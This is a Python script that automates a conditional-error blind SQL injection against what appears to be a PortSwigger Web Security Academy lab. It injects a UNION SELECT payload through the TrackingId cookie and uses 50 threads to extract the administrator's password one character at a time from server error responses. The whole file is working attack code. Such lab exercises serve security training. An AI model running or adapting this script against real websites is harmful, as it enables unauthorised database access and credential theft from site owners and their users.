import threading
import requests
import urllib3
import random
import string
import queue
import sys

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

alphabet = list(string.ascii_lowercase)
numbers = list(range(0, 21))
threads = 50

def split(word):
    return list(word)

def load_payloads():
    while True:
        numbers = queue_positions.get()        
        send_request(numbers[1], numbers[0])
        queue_positions.task_done()

def send_request(word, number):
    try:
        headers = {
                "Cookie": "TrackingId=x' UNION SELECT CASE WHEN (username='administrator' AND substr(password,{position},1)='{words}') THEN to_char(1/0) ELSE NULL END FROM users-- ;session=3r1oIeet7oOCETBGSGUx0fxhhWfMLRGJ".format(words=word,position=number)
        }
        request = requests.get(
                'https://.web-security-academy.net',
                verify=True,
                headers=headers
                )
        if 'Internal Server Error' in request.text:
            print('[+] Success {position}:{words}'.format(words=word,position=number))
        else:
#            print('[-] Not found {position}:{words}'.format(words=word,position=number))
            pass
    except Exception as err:
        print("[-] Exception: - ", err)
            
queue_positions = queue.Queue(threads * 2)

for i in range(threads):
    t = threading.Thread(target=load_payloads)
    t.start()

try:
    for number in split(numbers):
        for words in split(alphabet+numbers):
            queue_positions.put((number, words))
    queue_positions.join()

except KeyboardInterrupt:
    sys.exit(1)
